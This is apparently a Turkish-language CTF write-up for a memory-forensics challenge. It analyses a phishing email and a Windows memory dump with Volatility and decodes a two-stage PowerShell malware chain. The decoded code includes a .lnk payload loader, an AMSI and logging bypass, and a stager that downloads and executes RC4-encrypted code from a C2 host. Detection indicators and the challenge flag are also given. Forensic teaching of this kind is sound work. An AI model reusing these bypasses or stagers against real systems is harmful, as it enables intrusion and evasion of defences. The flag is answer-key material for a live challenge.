# Sherlock Holmes - Memory Forensics WriteUp

## 📋 Challenge Bilgileri

- **Kategori:** Forensics
- **Seviye:** Orta
- **Açıklama:** Bir işe alım görevlisinin sanal bilgisayarından şüpheli trafik tespit edildi. Sorunlu sanal makinenin bellek dökümü, görüntüleme ve analiz için ağdan kaldırılmadan önce yakalandı. İşe alım görevlimiz, birinden özgeçmişiyle ilgili bir e-posta aldığını belirtti. E-postanın bir kopyası kurtarıldı ve referans olarak sunuldu. Bayrağı bulmak için kötü amaçlı yazılımın kaynağını bulun ve şifresini çözün.

**Verilen Dosyalar:**
- `flounder-pc-memdump.elf` - Bellek dökümü dosyası
- `imageinfo.txt` - Volatility profil bilgisi
- `Resume.eml` - Şüpheli e-posta

---

## 🛠️ Gerekli Araçlar

### Volatility 3 Kurulumu

Volatility 3, Python tabanlı modern bir bellek forensics aracıdır.

#### Kali Linux'ta Kurulum

#### pipx ile Kurulum
```bash
sudo apt install pipx
pipx install volatility3
```


---

## 🔍 Analiz Süreci

### Adım 1: İlk Keşif - E-posta İncelemesi

Öncelikle `Resume.eml` dosyasını inceleyelim:
```
Return-Path: <bloodworm@madlab.lcl>
From: Brian Loodworm <bloodworm@madlab.lcl>
To: flounder@madlab.lcl
Subject: Resume

Hi Frank, someone told me you would be great to review my resume..
Could you have a look?

resume.zip [1] 

Links:
------
[1] http://10.10.99.55:8080/resume.zip
```

**🚩 İlk Şüpheli İşaretler:**
- Bilinmeyen gönderici (bloodworm@madlab.lcl)
- Harici bir IP adresine yönlendiren link (10.10.99.55:8080)
- Klasik phishing senaryosu: "Özgeçmişime bakar mısın?"

---

### Adım 2: Sistem Profili Kontrolü

`imageinfo.txt` dosyasından sistem bilgilerini öğreniyoruz:
```
Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64
AS Layer3 : FileAddressSpace (/home/infosec/dumps/mem_dumps/01/flounder-pc-memdump.elf)
Number of Processors : 2
Image Type (Service Pack) : 1
Image date and time : 2017-10-04 18:07:30 UTC+0000
Image local date and time : 2017-10-04 11:07:30 -0700
```

**Önemli Bilgiler:**
- **İşletim Sistemi:** Windows 7 SP1 x64
- **Bellek Dökümü Zamanı:** 2017-10-04 18:07:30 UTC
- **Profil:** Win7SP1x64

---

### Adım 3: Çalışan Süreçleri Listeleme

Bellek dökümünde hangi süreçlerin çalıştığını görelim:
```bash
vol -f flounder-pc-memdump.elf windows.pslist
```

**📊 Önemli Çıktılar:**
```
PID     PPID    ImageFileName   CreateTime      
4       0       System          2017-10-04 18:04:27.000000 UTC
272     4       smss.exe        2017-10-04 18:04:27.000000 UTC
476     376     services.exe    2017-10-04 18:04:29.000000 UTC
...
2044    2012    explorer.exe    2017-10-04 18:04:41.000000 UTC
2812    2044    thunderbird.ex  2017-10-04 18:06:24.000000 UTC  <- E-posta istemcisi
496     2044    powershell.exe  2017-10-04 18:06:58.000000 UTC  <- ŞÜPHELİ!
2752    496     powershell.exe  2017-10-04 18:07:00.000000 UTC  <- ÇOK ŞÜPHELİ!
```

**🚨 Kritik Bulgular:**

1. **PID 2812 - thunderbird.exe**
   - E-posta istemcisi aktif
   - Başlangıç zamanı: 18:06:24 UTC

2. **PID 496 - powershell.exe**
   - Parent Process: explorer.exe (PPID: 2044)
   - Thunderbird'den **34 saniye sonra** başlatılmış (18:06:58 UTC)
   - **Anormal davranış!** Kullanıcı manuel olarak PowerShell açmamış olabilir

3. **PID 2752 - powershell.exe**
   - Parent Process: İlk PowerShell (PPID: 496)
   - İlk PowerShell'den **2 saniye sonra** başlatılmış (18:07:00 UTC)
   - **Çok şüpheli!** PowerShell zincirleme (chaining) tespit edildi

**🔍 Neden Şüpheli?**
```
Normal Kullanım:
User -> Start Menu -> PowerShell (tek süreç)

Kötü Amaçlı Kullanım:
Thunderbird (E-posta açıldı)
    └─> resume.pdf.lnk (Kötü amaçlı dosya çalıştırıldı)
         └─> PowerShell #1 (İlk aşama payload)
              └─> PowerShell #2 (İkinci aşama payload - C2 beacon)
```

---

### Adım 4: PowerShell Komut Satırlarını İnceleme

Şimdi en kritik kısım - PowerShell süreçlerinin **ne yaptığını** görelim:
```bash
vol -f flounder-pc-memdump.elf windows.cmdline
```

#### 🎯 PID 496 (İlk Aşama PowerShell)
```powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
-win hidden 
-Ep ByPass 
$r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('JHN0UCwkc2lQPTMyMzAsOTY3NjskZj0ncmVzdW1lLnBkZi5sbmsnO2lmKC1ub3QoVGVzdC1QYXRoICRmKSl7JHg9R2V0LUNoaWxkSXRlbSAtUGF0aCAkZW52OnRlbXAgLUZpbHRlciAkZiAtUmVjdXJzZTtbSU8uRGlyZWN0b3J5XTo6U2V0Q3VycmVudERpcmVjdG9yeSgkeC5EaXJlY3RvcnlOYW1lKTt9JGxuaz1OZXctT2JqZWN0IElPLkZpbGVTdHJlYW0gJGYsJ09wZW4nLCdSZWFkJywnUmVhZFdyaXRlJzskYjY0PU5ldy1PYmplY3QgYnl0ZVtdKCRzaVApOyRsbmsuU2Vlaygkc3RQLFtJTy5TZWVrT3JpZ2luXTo6QmVnaW4pOyRsbmsuUmVhZCgkYjY0LDAsJHNpUCk7JGI2ND1bQ29udmVydF06OkZyb21CYXNlNjRDaGFyQXJyYXkoJGI2NCwwLCRiNjQuTGVuZ3RoKTskc2NCPVtUZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJGI2NCk7aWV4ICRzY0I7')); 
iex $r;
```

**🔑 Kötü Amaçlı İşaretler:**
- `-win hidden` → Gizli pencere (kullanıcı görmez)
- `-Ep ByPass` → Execution Policy bypass (güvenlik atlatma)
- `[Convert]::FromBase64String()` → Base64 decode
- `iex` (Invoke-Expression) → Decode edilen kodu çalıştır

**Base64 Payload'u Decode Edelim:**
```bash
echo 'JHN0UCwkc2lQPTMyMzAsOTY3NjskZj0ncmVzdW1lLnBkZi5sbmsnO2lmKC1ub3QoVGVzdC1QYXRoICRmKSl7JHg9R2V0LUNoaWxkSXRlbSAtUGF0aCAkZW52OnRlbXAgLUZpbHRlciAkZiAtUmVjdXJzZTtbSU8uRGlyZWN0b3J5XTo6U2V0Q3VycmVudERpcmVjdG9yeSgkeC5EaXJlY3RvcnlOYW1lKTt9JGxuaz1OZXctT2JqZWN0IElPLkZpbGVTdHJlYW0gJGYsJ09wZW4nLCdSZWFkJywnUmVhZFdyaXRlJzskYjY0PU5ldy1PYmplY3QgYnl0ZVtdKCRzaVApOyRsbmsuU2Vlaygkc3RQLFtJTy5TZWVrT3JpZ2luXTo6QmVnaW4pOyRsbmsuUmVhZCgkYjY0LDAsJHNpUCk7JGI2ND1bQ29udmVydF06OkZyb21CYXNlNjRDaGFyQXJyYXkoJGI2NCwwLCRiNjQuTGVuZ3RoKTskc2NCPVtUZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJGI2NCk7aWV4ICRzY0I7' | base64 -d
```

**Decoded Payload:**
```powershell
$stP,$siP=3230,9676;
$f='resume.pdf.lnk';
if(-not(Test-Path $f)){
    $x=Get-ChildItem -Path $env:temp -Filter $f -Recurse;
    [IO.Directory]::SetCurrentDirectory($x.DirectoryName);
}
$lnk=New-Object IO.FileStream $f,'Open','Read','ReadWrite';
$b64=New-Object byte[]($siP);
$lnk.Seek($stP,[IO.SeekOrigin]::Begin);
$lnk.Read($b64,0,$siP);
$b64=[Convert]::FromBase64CharArray($b64,0,$b64.Length);
$scB=[Text.Encoding]::Unicode.GetString($b64);
iex $scB;
```

**Ne Yapıyor?**
1. `resume.pdf.lnk` dosyasını TEMP klasöründe arıyor
2. Dosyadan **3230. byte'tan başlayarak 9676 byte** okuyor
3. Bu binary veriyi **Base64'ten decode** ediyor
4. Ortaya çıkan **PowerShell kodunu çalıştırıyor** (Stage 2)

Bu klasik bir **LNK dosyası içinde gizli payload** tekniği!

---

#### 🎯 PID 2752 (İkinci Aşama PowerShell - BAYRAK BURADA!)
```powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
-noP -sta -w 1 
-enc JABHAHIAbwBVAFAAUABPAEwAaQBDAFkAUwBFAHQAdABJAE4ARwBzACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBzAGUATQBCAEwAWQAuAEcARQB0AFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAVABWAGEAbABVAGUAKAAkAG4AdQBsAEwAKQA7ACQARwBSAG8AdQBQAFAATwBsAEkAQwB5AFMARQBUAFQAaQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAG8AdQBQAFAATwBMAEkAQwBZAFMARQB0AFQAaQBuAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAGUAZgBdAC4AQQBzAFMAZQBtAEIAbAB5AC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAGkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBMAHUARQAoACQATgB1AGwATAAsACQAVAByAHUAZQApAH0AOwBbAFMAeQBzAFQAZQBtAC4ATgBlAFQALgBTAEUAcgBWAEkAYwBlAFAATwBJAG4AdABNAEEAbgBBAGcARQBSAF0AOgA6AEUAeABwAEUAYwB0ADEAMAAwAEMATwBuAFQAaQBuAHUARQA9ADAAOwAkAFcAQwA9AE4ARQBXAC0ATwBCAGoARQBjAFQAIABTAHkAcwBUAEUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAEkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAB3AEMALgBIAGUAYQBEAGUAcgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBAAGcAZQBuAHQAJwAsACQAdQApADsAJABXAGMALgBQAFIAbwBYAHkAPQBbAFMAeQBzAFQAZQBNAC4ATgBFAFQALgBXAGUAYgBSAGUAcQB1AEUAcwB0AF0AOgA6AEQAZQBmAGEAVQBMAHQAVwBlAEIAUABSAE8AWABZADsAJAB3AEMALgBQAFIAbwBYAFkALgBDAFIARQBEAGUATgB0AEkAYQBMAFMAIAA9ACAAWwBTAFkAUwBUAGUATQAuAE4ARQBUAC4AQwByAGUARABFAG4AVABpAGEATABDAGEAQwBoAGUAXQA6ADoARABlAEYAYQB1AEwAVABOAEUAdAB3AE8AcgBrAEMAcgBlAGQAZQBuAHQAaQBBAGwAUwA7ACQASwA9AFsAUwBZAFMAdABFAE0ALgBUAGUAeAB0AC4ARQBOAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQB0AEUAcwAoACcARQAxAGcATQBHAGQAZgBUAEAAZQBvAE4APgB4ADkAewBdADIARgA3ACsAYgBzAE8AbgA0AC8AUwBpAFEAcgB3ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBjAC4ASABFAEEAZABFAHIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ATQBDAGEAaAB1AFEAVgBmAHoAMAB5AE0ANgBWAEIAZQA4AGYAegBWADkAdAA5AGoAbwBtAG8APQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADkAOQAuADUANQA6ADgAMAAnADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABmAGwAYQBnAD0AJwBIAFQAQgB7ACQAXwBqADAARwBfAHkAMAB1AFIAXwBNADMAbQAwAHIAWQBfACQAfQAnADsAJABEAGEAdABBAD0AJABXAEMALgBEAG8AVwBOAEwAbwBhAEQARABBAFQAQQAoACQAUwBlAFIAKwAkAHQAKQA7ACQAaQB2AD0AJABkAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABhAD0AJABEAGEAVABhAFsANAAuAC4AJABEAEEAdABhAC4ATABlAG4ARwBUAEgAXQA7AC0ASgBPAEkATgBbAEMASABBAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=
```

Bu base64 string çok uzun! Decode edelim:
```bash
echo 'JABHAHIAbwBVAFAAUABPAEwAaQBDAFkAUwBFAHQAdABJAE4ARwBzACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBzAGUATQBCAEwAWQAuAEcARQB0AFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAVABWAGEAbABVAGUAKAAkAG4AdQBsAEwAKQA7ACQARwBSAG8AdQBQAFAATwBsAEkAQwB5AFMARQBUAFQAaQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAG8AdQBQAFAATwBMAEkAQwBZAFMARQB0AFQAaQBuAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAGUAZgBdAC4AQQBzAFMAZQBtAEIAbAB5AC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAGkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBMAHUARQAoACQATgB1AGwATAAsACQAVAByAHUAZQApAH0AOwBbAFMAeQBzAFQAZQBtAC4ATgBlAFQALgBTAEUAcgBWAEkAYwBlAFAATwBJAG4AdABNAEEAbgBBAGcARQBSAF0AOgA6AEUAeABwAEUAYwB0ADEAMAAwAEMATwBuAFQAaQBuAHUARQA9ADAAOwAkAFcAQwA9AE4ARQBXAC0ATwBCAGoARQBjAFQAIABTAHkAcwBUAEUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAEkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAB3AEMALgBIAGUAYQBEAGUAcgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABXAGMALgBQAFIAbwBYAHkAPQBbAFMAeQBzAFQAZQBNAC4ATgBFAFQALgBXAGUAYgBSAGUAcQB1AEUAcwB0AF0AOgA6AEQAZQBmAGEAVQBMAHQAVwBlAEIAUABSAE8AWABZADsAJAB3AEMALgBQAFIAbwBYAFkALgBDAFIARQBEAGUATgB0AEkAYQBMAFMAIAA9ACAAWwBTAFkAUwBUAGUATQAuAE4ARQBUAC4AQwByAGUARABFAG4AVABpAGEATABDAGEAQwBoAGUAXQA6ADoARABlAEYAYQB1AEwAVABOAEUAdAB3AE8AcgBrAEMAcgBlAGQAZQBuAHQAaQBBAGwAUwA7ACQASwA9AFsAUwBZAFMAdABFAE0ALgBUAGUAeAB0AC4ARQBOAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQB0AEUAcwAoACcARQAxAGcATQBHAGQAZgBUAEAAZQBvAE4APgB4ADkAewBdADIARgA3ACsAYgBzAE8AbgA0AC8AUwBpAFEAcgB3ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBjAC4ASABFAEEAZABFAHIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ATQBDAGEAaAB1AFEAVgBmAHoAMAB5AE0ANgBWAEIAZQA4AGYAegBWADkAdAA5AGoAbwBtAG8APQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADkAOQAuADUANQA6ADgAMAAnADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABmAGwAYQBnAD0AJwBIAFQAQgB7ACQAXwBqADAARwBfAHkAMAB1AFIAXwBNADMAbQAwAHIAWQBfACQAfQAnADsAJABEAGEAdABBAD0AJABXAEMALgBEAG8AVwBOAEwAbwBhAEQARABBAFQAQQAoACQAUwBlAFIAKwAkAHQAKQA7ACQAaQB2AD0AJABkAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABhAD0AJABEAGEAVABhAFsANAAuAC4AJABEAEEAdABhAC4ATABlAG4ARwBUAEgAXQA7AC0ASgBPAEkATgBbAEMASABBAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=' | base64 -d
```

**Decoded Payload (Önemli Kısımlar):**
```powershell
# AMSI Bypass
$GRouPPOLiCySEttINGs = [rEF].ASseMBLY.GEtTypE('System.Management.Automation.Utils')."GEtFIE`ld"('cachedGroupPolicySettings', 'N'+'onPublic,Static').GETValUe($nulL);
$GRouPPOLICySEtTiNgS['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0;
$GRouPPOLICYSEtTingS['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0;

[Ref].AsSemBly.GeTTyPE('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GEtFieLd('amsiInitFailed','NonPublic,Static').SETVaLuE($NulL,$True)};

# Network Connection Setup
[SysTem.NeT.SEr VIceP OIntMAnAgER]::ExpEct100COnTinuE=0;
$WC=NEW-OBjEcT SysTEM.NEt.WebClIEnt;
$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$wC.HeaDerS.Add('User-Agent',$u);

# Encryption Key
$K=[SYStEM.Text.ENCODIng]::ASCII.GEtBytEs('E1gMGdfT@eoN>x9{]2F7+bsOn4/SiQrw');

# RC4 Decryption Function
$R={$D,$K=$ArgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxoR$S[($S[$I]+$S[$H])%256]}};

# Cookie Setup
$wc.HEAdErs.ADD("Cookie","session=MCahuQVfz0yM6VBe8fzV9t9jomo=");

# C2 Server
$ser='http://10.10.99.55:80';
$t='/login/process.php';

# 🚩 BAYRAK BURADA! 🚩
$flag='HTB{$_j0G_y0uR_M3m0rY_$}';

# Download and Execute
$DatA=$WC.DoWNLoaDDAtA($SeR+$t);
$iv=$daTA[0..3];
$DAta=$DAta[4..$DAta.LenGTH];
-JOIN[CHAr[]](& $R $datA ($IV+$K))|IEX
```

---

## 🏆 BAYRAK BULUNDU!
```
HTB{$_j0G_y0uR_M3m0rY_$}
```

---

## 📝 Saldırı Akışı Özeti
```
1. Phishing E-posta
   └─> Brian Loodworm'dan sahte özgeçmiş e-postası
        └─> Link: http://10.10.99.55:8080/resume.zip

2. Dosya İndirme ve Çalıştırma
   └─> Kullanıcı resume.zip'i indirir
        └─> İçinde: resume.pdf.lnk (kötü amaçlı shortcut dosyası)
             └─> LNK dosyası çift tıklandığında PowerShell #1 başlatılır

3. İlk Aşama (Stage 1) - PID 496
   └─> PowerShell #1 gizli modda çalışır
        └─> resume.pdf.lnk dosyasından gömülü payload'u çıkarır
             └─> Base64 decode eder ve PowerShell #2'yi başlatır

4. İkinci Aşama (Stage 2) - PID 2752
   └─> PowerShell #2 çalışır
        ├─> AMSI Bypass (güvenlik atlatma)
        ├─> ScriptBlock Logging devre dışı
        ├─> C2 sunucusuna bağlanır (10.10.99.55:80)
        ├─> RC4 ile şifrelenmiş komutları indirir
        └─> Komutları çalıştırır (Remote Code Execution)
```

---

## 🔍 Tespit Teknikleri ve İşaretler

### PowerShell Kötü Amaçlı Kullanım İşaretleri
```powershell
# Şüpheli parametreler
-win hidden              # Gizli pencere
-w 1                     # Gizli pencere (window style 1)
-ep bypass               # Execution policy bypass
-nop                     # No profile
-enc                     # Encoded command

# Şüpheli komutlar
iex                      # Invoke-Expression (kod çalıştırma)
[Convert]::FromBase64String()  # Base64 decode
New-Object Net.WebClient       # Web istekleri
DownloadString()               # Remote script indirme
```

### Bellek Forensics İşaretleri
```bash
# Şüpheli süreç ilişkileri
explorer.exe -> powershell.exe           # Anormal
powershell.exe -> powershell.exe         # Çok şüpheli
WINWORD.exe -> cmd.exe                   # Makro saldırısı
excel.exe -> powershell.exe              # Makro saldırısı

# Zaman bazlı analiz
- E-posta açıldıktan hemen sonra PowerShell başlaması
- PowerShell zincirleme (process chain)
- Beklenmeyen parent-child ilişkileri
```

---


---



## ✅ Çözüm Adımları Özeti

1. ✅ E-posta içeriğini inceleyin (phishing tespiti)
2. ✅ `vol -f memory.dump windows.pslist` - Şüpheli süreçleri bulun
3. ✅ `vol -f memory.dump windows.cmdline` - PowerShell komutlarını görün
4. ✅ Base64 payloadları decode edin
5. ✅ Bayrak değişkenini bulun: `$flag='HTB{$_j0G_y0uR_M3m0rY_$}'`

---

## 🎯 Flag
```
HTB{$_j0G_y0uR_M3m0rY_$}
```


---

